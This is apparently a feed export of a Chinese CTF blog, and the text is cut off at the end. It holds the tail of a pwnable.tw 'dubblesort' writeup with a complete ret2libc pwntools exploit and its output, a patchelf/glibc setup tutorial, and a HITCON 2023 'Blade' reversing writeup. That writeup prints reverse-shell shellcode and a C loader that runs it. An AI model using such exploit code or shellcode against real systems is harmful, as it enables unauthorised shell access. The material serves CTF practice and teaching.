class="code"><pre><span class="line">└─$ cat exploit.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line">l = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">27</span> + <span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.address = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x1b0000</span> - <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line">success(<span class="string">&#x27;system -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.sym.system))</span><br><span class="line">success(<span class="string">&#x27;bin_sh -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(<span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;35&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(l.sym.system))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline( <span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span> )</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10101: Done</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/dubblesort/libc_32.so.6&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] libc_base -&gt; 0xf75be000</span><br><span class="line">[+] system -&gt; 0xf75f8940</span><br><span class="line">[+] bin_sh -&gt; 0xf7716e8b</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Processing......</span><br><span class="line">Result :</span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2731900928 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4151406219 FLAG&#123;XXXXXXXXXXXXXXXXXXXX&#125;</span><br></pre></td></tr></table></figure></div><h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-dubblesort&quot;&gt;&lt;a href=&quot;#Pwnable-tw-dubblesort&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - dubblesort&quot;&gt;&lt;/a&gt;Pwnable.tw - dubbleso</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>Patchelf &amp; Glibc-all-in-one Combo</title>
    <link href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/"/>
    <id>https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/</id>
    <published>2024-04-19T01:05:57.000Z</published>
    <updated>2024-04-25T13:15:05.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Patchelf-Glibc-all-in-one-Combo"><a href="#Patchelf-Glibc-all-in-one-Combo" class="headerlink" title="Patchelf &amp; Glibc-all-in-one Combo"></a>Patchelf &amp; Glibc-all-in-one Combo</h1><p>這篇主要會提到平常在模擬 Pwn 遠端環境的好用組合技。</p><h2 id="0x1-Introduction"><a href="#0x1-Introduction" class="headerlink" title="0x1 Introduction"></a>0x1 Introduction</h2><p>今天會用 <a class="link"   href="https://pwnable.tw/" >pwnable.tw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link"   href="https://pwnable.tw/challenge/#4" >dubblesort <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 示範。<br><code>patchelf</code> 和 <code>glibc-all-in-one</code> 安裝方式如下：</p><h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo apt install patchelf</span><br></pre></td></tr></table></figure></div><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git </span><br></pre></td></tr></table></figure></div><h2 id="0x2-Demo"><a href="#0x2-Demo" class="headerlink" title="0x2 Demo"></a>0x2 Demo</h2><ul><li>首先我們要知道題目附給我們的 libc 是什麼版本的：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ strings libc_32.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br></pre></td></tr></table></figure></div>從上面可以得知版本是：<code>2.23-0ubuntu5</code>。</li><li>接著我們要用 glibc-all-in-one 去找到對應版本需要的文件：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">└─$ ./update_list</span><br><span class="line">└─$ <span class="built_in">cat</span> list</span><br></pre></td></tr></table></figure></div>看了一下會發現 list 沒有我們要的版本，可以在 <a class="link"   href="https://launchpad.net/ubuntu/+source/glibc" >https://launchpad.net/ubuntu/+source/glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 找，或是直接打對應版本的網址 <a class="link"   href="https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5" >https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。<br>右側的 <code>Builds</code> 裡面找到裡面找到題目使用的 CPU 架構。<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file dubblesort</span><br><span class="line">dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped</span><br></pre></td></tr></table></figure></div>這題為 <code>Intel 80386</code>。<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cd</span> ~/glibc-all-in-one/debs</span><br><span class="line">└─$ wget http://launchpadlibrarian.net/293727477/libc6_2.23-0ubuntu5_i386.deb</span><br><span class="line">└─$ <span class="built_in">mkdir</span> ~/glibc-all-in-one/libs/2.23-0ubuntu5_i386</span><br><span class="line">└─$ <span class="built_in">cd</span> ~/glibc-all-in-one/ </span><br><span class="line">└─$ ./extract debs/libc6_2.23-0ubuntu5_i386.deb libs/2.23-0ubuntu5_i386</span><br><span class="line">└─$ <span class="built_in">cd</span> ~/glibc-all-in-one/libs/2.23-0ubuntu5_i386</span><br></pre></td></tr></table></figure></div>那如果 list 有你想要的版本可以直接如下操作：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure></div>一樣會在 <code>~/glibc-all-in-one/libs</code> 下看到對應的資料夾。</li><li><code>ldd</code>:<br>全名是：List Dynamic Dependencies。可以查看一個程式在運行時需要鏈接的所有共享函式庫。用法如下：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldd dubblesort</span><br><span class="line">        linux-gate.so.1 (0xf7f9e000)</span><br><span class="line">        libc.so.6 =&gt; /lib32/libc.so.6 (0xf7c00000)</span><br><span class="line">        /lib/ld-linux.so.2 (0xf7fa0000)</span><br></pre></td></tr></table></figure></div>可以看到目前都是用到本地 <code>/lib32</code> 還有 <code>/lib</code> 下的檔案 ，我們可以在 <code>patchelf</code> 後來觀察一下變化。</li><li><code>patchelf</code>：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cp</span> /home/kazma/glibc-all-in-one/libs/2.23-0ubuntu5_i386/ld-2.23.so  ./</span><br><span class="line">└─$ patchelf --set-interpreter ./ld-2.23.so dubblesort</span><br><span class="line">└─$ patchelf --replace-needed libc.so.6 ./libc_32.so.6 dubblesort</span><br><span class="line">└─$ ldd dubblesort</span><br><span class="line">        linux-gate.so.1 (0xf7fba000)</span><br><span class="line">        ./libc_32.so.6 (0xf7df7000)</span><br><span class="line">        ./ld-2.23.so =&gt; /lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure></div></li><li>成功執行：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./dubblesort</span><br><span class="line">What your name :</span><br></pre></td></tr></table></figure></div>以上是模擬遠端環境的一個簡單示範，之後有遇到其他特殊狀況會持續更新在這邊，有問題也歡迎找我討論 ~</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Patchelf-Glibc-all-in-one-Combo&quot;&gt;&lt;a href=&quot;#Patchelf-Glibc-all-in-one-Combo&quot; class=&quot;headerlink&quot; title=&quot;Patchelf &amp;amp; Glibc-all-in-on</summary>
      
    
    
    
    
    <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
    
    <category term="binary" scheme="https://kazma.tw/tags/binary/"/>
    
  </entry>
  
  <entry>
    <title>HITCON-CTF-2023 Full Chain - The Blade Writeup</title>
    <link href="https://kazma.tw/2024/02/19/HITCON-CTF-2023-Full-Chain-The-Blade-Writeup/"/>
    <id>https://kazma.tw/2024/02/19/HITCON-CTF-2023-Full-Chain-The-Blade-Writeup/</id>
    <published>2024-02-18T17:44:30.000Z</published>
    <updated>2024-03-24T20:59:51.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HITCON-CTF-2023-Full-Chain-The-Blade"><a href="#HITCON-CTF-2023-Full-Chain-The-Blade" class="headerlink" title="HITCON-CTF-2023 - Full Chain - The Blade"></a>HITCON-CTF-2023 - Full Chain - The Blade</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>A Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.<br>(Hey, this is my first Rust project. Feel free to give me any advice and criticism 😃)</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://github.com/hitconctf/ctf2023.hitcon.org/releases/download/v1.0.0/blade-4c2ff1b60902623f702f0245a6a9ea0e71eeb385" >https://github.com/hitconctf/ctf2023.hitcon.org/releases/download/v1.0.0/blade-4c2ff1b60902623f702f0245a6a9ea0e71eeb385 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>例行檢查：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file blade</span><br><span class="line">blade: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0c08e0f6f802d4a18151f338c9aab85e8b8f66d3, <span class="keyword">for</span> GNU/Linux 4.4.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure></div><p>執行看看：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./blade</span><br><span class="line">&gt; <span class="built_in">test</span></span><br><span class="line">[-] Unknown <span class="built_in">command</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command       Description</span><br><span class="line">        -------       -----------</span><br><span class="line">        <span class="built_in">help</span>          Help menu</span><br><span class="line">        server        Establish C&amp;C server</span><br><span class="line">        <span class="built_in">exit</span>          Exit program</span><br></pre></td></tr></table></figure></div><p>可以看到提供三個功能，不過 <code>help</code> 跟 <code>exit</code> 沒什麼特別的，我們試試 <code>server</code>:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command                Description</span><br><span class="line">        -------                -----------</span><br><span class="line">        options                List all options</span><br><span class="line">        <span class="built_in">set</span> &lt;option&gt; &lt;value&gt;   Set option</span><br><span class="line">        run                    Start server</span><br><span class="line">        close                  Close server</span><br><span class="line">        back                   Back to menu</span><br><span class="line">server&gt; options</span><br><span class="line"></span><br><span class="line">    Options</span><br><span class="line">    =======</span><br><span class="line"></span><br><span class="line">        Option        Value           Description</span><br><span class="line">        ------        -----           -----------</span><br><span class="line">        host          127.0.0.1       Server host</span><br><span class="line">        port          4444            Server port</span><br><span class="line">        format        quoted          Shellcode format</span><br><span class="line">        read_syscall  SYS_read        Read syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Available Syscalls</span><br><span class="line">    ==================</span><br><span class="line"></span><br><span class="line">        Verb          Syscalls</span><br><span class="line">        ----          --------</span><br><span class="line">        read_syscall  SYS_read, SYS_recvfrom</span><br><span class="line"></span><br><span class="line">    Shellcode Formats</span><br><span class="line">    ==================</span><br><span class="line"></span><br><span class="line">        Format        Example</span><br><span class="line">        -------       -------</span><br><span class="line">        quoted        <span class="string">&quot;\xde\xad\xbe\xef&quot;</span></span><br><span class="line">        hex           deadbeef</span><br></pre></td></tr></table></figure></div><p>看起來這個 <code>server</code> 模式就是剛剛題目敘述提到的 <code>seccomp environment</code>，並且可以設定一些相關參數。<br>Start server 看看:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./blade</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br></pre></td></tr></table></figure></div><p>Start 之後可以看到他要我們在受害者的電腦上執行一段 shellcode，然後在 <code>127.0.0.1:4444</code> 有服務等待連接。<br>直接 nc 上去執行指令會噴一堆亂碼，然後還會卡住，感覺不太像是正常的交互，我在同一個資料夾下面建一個 shellcode.c 來執行這段 shellcode，注意在 compile 的時候要關掉 NX：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)())(shellcode))();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc shellcode.c -o shellcode -z execstack</span></span><br></pre></td></tr></table></figure></div><p>執行後就會拿到 reverse shell 了，指令也都可以正常執行:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./blade</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line">[+] Connection established from 127.0.0.1:43654</span><br><span class="line">$ <span class="built_in">test</span></span><br><span class="line">[-] Unknown <span class="built_in">command</span> <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command                    Description                                    Syscalls</span><br><span class="line">        -------                    -------                                        -----------</span><br><span class="line">        <span class="built_in">help</span>                       Print This Menu                                N/A</span><br><span class="line">        <span class="built_in">ls</span> [DIR]                   List Directory                                 SYS_open, SYS_getdents</span><br><span class="line">        <span class="built_in">dir</span> [DIR]                  List Directory                                 SYS_open, SYS_getdents</span><br><span class="line">        <span class="built_in">cat</span> &lt;FILE&gt;                 Print File Content                             SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">cd</span> &lt;DIR&gt;                   Change Directory                               SYS_chdir</span><br><span class="line">        <span class="built_in">pwd</span>                        Print Current Directory                        SYS_getcwd</span><br><span class="line">        download &lt;FILE&gt;            Download File                                  SYS_open, SYS_close</span><br><span class="line">        upload &lt;FILE&gt; [PERM]       Upload File                                    SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">rm</span> &lt;FILE&gt;                  Remove File                                    SYS_unlink</span><br><span class="line">        <span class="built_in">mv</span> &lt;SOURCE&gt; &lt;DEST&gt;         Move File                                      SYS_rename</span><br><span class="line">        <span class="built_in">cp</span> &lt;SOURCE&gt; &lt;DEST&gt; [PERM]  Copy File                                      SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">mkdir</span> &lt;DIR&gt; [PERM]         Create a Directory                             SYS_mkdir</span><br><span class="line">        <span class="built_in">rmdir</span> &lt;DIR&gt;                Remove a Directory                             SYS_rmdir</span><br><span class="line">        getuid                     Get Current UID                                SYS_getuid</span><br><span class="line">        getgid                     Get Current GID                                SYS_getgid</span><br><span class="line">        portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        netcat &lt;INPUT_FILE&gt; &lt;Port&gt; Send Data <span class="keyword">in</span> the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">                                   and Receive Output</span><br><span class="line">        http-shell                 HTTP Interactive Shell                         SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        redis-cli                  Simple Redis Client                            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        <span class="built_in">exit</span>                       Exit shell                                     N/A</span><br><span class="line">        quit                       Exit shell                                     N/A</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[+] Listing directory <span class="string">&#x27;.&#x27;</span></span><br><span class="line">shellcode.c</span><br><span class="line">blade</span><br><span class="line">shellcode</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><p>看了 menu 之後沒看到任何跟 flag checker 有關的指令，我們再回憶一下題目敘述：</p><blockquote><p>Your goal is to pass the hidden flag checker concealed in the binary.</p></blockquote><p>上面的翻譯是：該開 IDA 了 XD</p><h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><p>丟進 IDA 後在 <code>Function name</code> 逛了一下後會看到剛剛 server 模式的那些指令，而這邊函式名前綴為 <code>seccomp_shell</code> 也符合我們的猜測，其中有個可疑的 <code>verify()</code> 函式，感覺蠻可能跟 flag checker 有關聯：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_verify.png"                      alt="verify"                ><br>但分析 <code>verify()</code> 前，我們先找到呼叫 <code>verify()</code> 的地方，這樣方便我們透過傳入的參數去推理逆向，也有機會找到他用來檢查 flag 的指令，那 <code>prompt()</code> 感覺就是在做管理整個 <code>seccomp_shell</code> 之類的功能，我們從這裡先開始分析。</p><h3 id="prompt"><a href="#prompt" class="headerlink" title="prompt()"></a>prompt()</h3><p><code>void ***__fastcall seccomp_shell::shell::prompt::h76cecfe7bd3bdf50(__int64 a1)</code><br>接收了一個參數應該就是指令，我們重新命名整理一下：<br><code>a1 -&gt; inputCommand</code><br>接著發現指令呼叫時傳入的第一個參數都是 <code>v162</code>，而且 <code>v162</code> 就是剛剛的 <code>a1</code>，所以給他個新名字：<br><code>v162 -&gt; commandString</code><br>再來就大概花了億點時間在尋找用來觸發 <code>verify()</code> 的指令，看了很久都沒啥進展的同時決定出門吃個晚餐，回來發現學長把電腦重開機（RDP 到社團的公共電腦），IDA 只好重新解一次，沒想到解完後就正常多了，如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_flag.png"                      alt="flag"                ><br>看到這次他把他解成 switch，然後 case 看起來像是 ASCII 的字串，對字串按 r 之後可以看到 little endian 的 <code>flag</code>、<code>exit</code> 和 <code>quit</code> 等指令，測試一下 <code>flag</code> 指令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ flag hitcon&#123;flag&#125;</span><br><span class="line">[-] Incorrect</span><br></pre></td></tr></table></figure></div><p>看起來很對，差不多該分析 <code>verify()</code> 了。</p><h3 id="verify"><a href="#verify" class="headerlink" title="verify()"></a>verify()</h3><ol><li>一進去就會看到可能是在檢查 flag 長度的判斷式：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( len != <span class="number">64</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$$RF$str$GT$$GT$::from::<span class="built_in">hc50629fd4c285201</span>();</span><br><span class="line">    <span 